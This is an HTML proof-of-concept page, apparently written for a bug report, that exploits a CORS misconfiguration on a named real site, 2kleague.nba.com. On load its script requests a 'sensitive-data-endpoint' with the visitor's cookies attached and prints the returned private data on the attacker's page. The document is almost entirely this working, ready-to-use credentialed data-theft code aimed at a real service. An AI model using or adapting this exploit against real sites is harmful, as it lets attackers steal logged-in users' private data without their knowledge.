<!DOCTYPE html>
<html>
  <head>
    <title>NBA CORS PoC</title>
  </head>
  <body>
    <h1>Stealing data from 2kleague.nba.com...</h1>
    <script>
      fetch('https://2kleague.nba.com/api/v1/sensitive-data-endpoint', {
        // This is the crucial part that sends the user's cookies
        credentials: 'include' 
      })
      .then(response => response.text())
      .then(data => {
        // If successful, the user's private data is now in the 'data' variable
        alert('SUCCESS: Leaked data from 2kleague.nba.com! See page content.');
        document.body.innerHTML += '<h2>Leaked Data:</h2><pre>' + data + '</pre>';
      })
      .catch(error => {
        alert('FAILED: Could not fetch data. Check the console for errors.');
        console.error('CORS PoC Error:', error);
      });
    </script>
  </body>
</html>
